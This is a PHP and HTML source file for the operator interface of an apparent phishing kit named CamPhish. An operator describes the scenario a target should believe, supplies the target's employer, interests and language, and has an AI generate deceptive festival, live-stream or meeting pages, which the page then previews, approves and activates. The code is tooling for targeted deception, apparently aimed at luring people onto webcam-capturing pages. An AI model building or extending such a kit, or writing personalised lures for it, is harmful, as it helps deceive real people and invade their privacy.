<?php
$templates = [];
$dir = '/data/templates/ai-generated/';
if (is_dir($dir)) {
    foreach (scandir($dir, SCANDIR_SORT_DESCENDING) as $f) {
        if (preg_match('/^ai_.*\.json$/', $f)) {
            $meta = json_decode(file_get_contents($dir . $f), true);
            if ($meta) {
                $meta['has_html'] = file_exists($dir . str_replace('.json', '.html', $f));
                $templates[] = $meta;
            }
        }
    }
}

$activeFile = '/data/templates/ai-generated/active.json';
$activeId = '';
if (file_exists($activeFile)) {
    $active = json_decode(file_get_contents($activeFile), true);
    $activeId = $active['template_id'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Template Generator — CamPhish</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
        .header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 24px;display:flex;justify-content:space-between;align-items:center}
        .header h1{font-size:20px;color:#58a6ff}
        .header nav a{color:#8b949e;text-decoration:none;margin-left:16px;font-size:13px}
        .header nav a:hover{color:#c9d1d9}
        .header nav a.active{color:#58a6ff}
        .container{max-width:1200px;margin:0 auto;padding:24px}
        .layout{display:grid;grid-template-columns:1fr 1fr;gap:24px}
        @media(max-width:900px){.layout{grid-template-columns:1fr}}
        .panel{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px}
        .panel h2{font-size:16px;color:#f0f6fc;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid #30363d}
        .form-group{margin-bottom:12px}
        .form-group label{display:block;font-size:12px;color:#8b949e;margin-bottom:4px;text-transform:uppercase}
        .form-group textarea,.form-group input,.form-group select{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;font-family:inherit}
        .form-group textarea{resize:vertical;min-height:100px}
        .form-group textarea:focus,.form-group input:focus,.form-group select:focus{outline:none;border-color:#58a6ff}
        .btn{padding:8px 16px;border-radius:6px;border:none;cursor:pointer;font-size:13px;font-weight:500}
        .btn-primary{background:#238636;color:#fff}
        .btn-primary:hover{background:#2ea043}
        .btn-primary:disabled{background:#21262d;color:#484f58;cursor:not-allowed}
        .btn-danger{background:#da3633;color:#fff}
        .btn-danger:hover{background:#f85149}
        .btn-secondary{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
        .btn-secondary:hover{background:#30363d}
        .btn-sm{padding:4px 10px;font-size:12px}
        .template-card{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;margin-bottom:8px}
        .template-card.active{border-color:#3fb950}
        .template-card .title{font-size:14px;color:#c9d1d9;font-weight:500}
        .template-card .meta{font-size:11px;color:#8b949e;margin-top:4px}
        .template-card .actions{display:flex;gap:6px;margin-top:8px}
        .badge{font-size:10px;padding:1px 6px;border-radius:10px}
        .badge-approved{background:#1f3a2e;color:#3fb950}
        .badge-pending{background:#3a2e1f;color:#d29922}
        .badge-active{background:#1f2e3a;color:#58a6ff}
        .spinner{display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .preview-frame{width:100%;height:500px;border:1px solid #30363d;border-radius:6px;background:#fff}
        .toast{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:8px;font-size:13px;z-index:2000;animation:slideIn .3s ease}
        .toast.success{background:#1f3a2e;color:#3fb950;border:1px solid #238636}
        .toast.error{background:#3a1f1f;color:#f85149;border:1px solid #da3633}
        @keyframes slideIn{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
        .empty-state{text-align:center;padding:40px 20px;color:#8b949e}
    </style>
</head>
<body>
    <div class="header">
        <h1>AI Template Generator</h1>
        <nav>
            <a href="/operator/">Sessions</a>
            <a href="/">Dashboard</a>
            <a href="/ai-generator/" class="active">AI Templates</a>
        </nav>
    </div>
    <div class="container">
        <div class="layout">
            <div>
                <div class="panel">
                    <h2>Generate New Template</h2>
                    <div class="form-group">
                        <label>Template Type</label>
                        <select id="templateType">
                            <option value="festival">Festival / Celebration</option>
                            <option value="youtube">Live YouTube Stream</option>
                            <option value="meeting">Online Meeting / Conference</option>
                            <option value="custom">Custom (describe below)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Target Context</label>
                        <textarea id="context" placeholder="Describe the scenario the target should believe.&#10;&#10;Example: 'A corporate end-of-year awards ceremony where employees are invited to join a live video stream to watch the CEO announcement. The target works at a tech company in San Francisco.'"></textarea>
                    </div>
                    <div class="form-group">
                        <label>Target Information (optional)</label>
                        <input type="text" id="targetInfo" placeholder="e.g. Works at Acme Corp, interested in crypto, speaks Spanish">
                    </div>
                    <div class="form-group">
                        <label>Language</label>
                        <select id="language">
                            <option value="english">English</option>
                            <option value="spanish">Spanish</option>
                            <option value="french">French</option>
                            <option value="german">German</option>
                            <option value="chinese">Chinese</option>
                            <option value="japanese">Japanese</option>
                            <option value="arabic">Arabic</option>
                            <option value="hindi">Hindi</option>
                        </select>
                    </div>
                    <button class="btn btn-primary" id="generateBtn" onclick="generateTemplate()">
                        Generate Template
                    </button>
                    <div id="generateStatus" style="margin-top:12px;font-size:13px"></div>
                </div>

                <div class="panel" style="margin-top:16px">
                    <h2>Generated Templates</h2>
                    <div id="templateList"></div>
                </div>
            </div>

            <div>
                <div class="panel">
                    <h2>Preview</h2>
                    <div id="previewInfo" style="font-size:12px;color:#8b949e;margin-bottom:8px"></div>
                    <iframe id="previewFrame" class="preview-frame" sandbox="allow-scripts" srcdoc="<html><body style='background:#fff;display:flex;align-items:center;justify-content:center;height:100%;color:#666;font-family:sans-serif'><p>Select a template to preview</p></body></html>"></iframe>
                </div>
            </div>
        </div>
    </div>

    <div id="toastContainer"></div>

    <script>
        function toast(msg, type) {
            const el = document.createElement('div');
            el.className = 'toast ' + type;
            el.textContent = msg;
            document.getElementById('toastContainer').appendChild(el);
            setTimeout(() => el.remove(), 3000);
        }

        async function api(method, body) {
            const res = await fetch('/ai-generator/api.php', {
                method: method,
                headers: {'Content-Type': 'application/json'},
                body: body ? JSON.stringify(body) : undefined
            });
            return res.json();
        }

        async function generateTemplate() {
            const btn = document.getElementById('generateBtn');
            const status = document.getElementById('generateStatus');
            const context = document.getElementById('context').value.trim();

            if (!context) { toast('Context description is required', 'error'); return; }

            btn.disabled = true;
            status.innerHTML = '<span class="spinner"></span> Generating with AI...';

            const result = await api('POST', {
                action: 'generate',
                context: context,
                template_type: document.getElementById('templateType').value,
                target_info: document.getElementById('targetInfo').value.trim(),
                language: document.getElementById('language').value
            });

            btn.disabled = false;

            if (result.error) {
                status.textContent = '';
                toast(result.error, 'error');
                return;
            }

            status.textContent = 'Generated! ' + result.html_length + ' bytes';
            toast('Template generated: ' + result.template_id, 'success');
            previewTemplate(result.template_id);
            refreshTemplates();
        }

        async function previewTemplate(id) {
            const result = await api('POST', {action: 'preview', id: id});
            if (result.error) { toast(result.error, 'error'); return; }
            document.getElementById('previewFrame').srcdoc = result.html;
            document.getElementById('previewInfo').textContent = 'Previewing: ' + id;
        }

        async function approveTemplate(id) {
            const result = await api('POST', {action: 'approve', id: id});
            if (result.error) { toast(result.error, 'error'); return; }
            toast('Template approved and activated!', 'success');
            refreshTemplates();
        }

        async function deleteTemplate(id) {
            if (!confirm('Delete this template?')) return;
            const result = await api('POST', {action: 'delete', id: id});
            if (result.error) { toast(result.error, 'error'); return; }
            toast('Template deleted', 'success');
            refreshTemplates();
        }

        async function refreshTemplates() {
            const data = await api('GET');
            const list = document.getElementById('templateList');
            const templates = data.templates || [];

            if (templates.length === 0) {
                list.innerHTML = '<div class="empty-state"><p>No templates generated yet.</p></div>';
                return;
            }

            list.innerHTML = templates.map(t => {
                const isActive = t.id === (data.active_id || '');
                const typeLabel = {festival:'Festival',youtube:'YouTube',meeting:'Meeting',custom:'Custom'}[t.type] || t.type;
                return `
                <div class="template-card ${isActive ? 'active' : ''}">
                    <div class="title">${esc(t.id)}</div>
                    <div class="meta">
                        Type: ${typeLabel} · ${t.html_length || '?'} bytes · ${t.created_at ? t.created_at.slice(0,10) : '—'}
                        ${t.approved ? '<span class="badge badge-approved">APPROVED</span>' : '<span class="badge badge-pending">PENDING</span>'}
                        ${isActive ? '<span class="badge badge-active">ACTIVE</span>' : ''}
                    </div>
                    <div class="actions">
                        <button class="btn btn-secondary btn-sm" onclick="previewTemplate('${esc(t.id)}')">Preview</button>
                        ${!t.approved ? `<button class="btn btn-primary btn-sm" onclick="approveTemplate('${esc(t.id)}')">Approve & Activate</button>` : ''}
                        <button class="btn btn-danger btn-sm" onclick="deleteTemplate('${esc(t.id)}')">Delete</button>
                    </div>
                </div>`;
            }).join('');
        }

        function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

        refreshTemplates();
    </script>
</body>
</html>
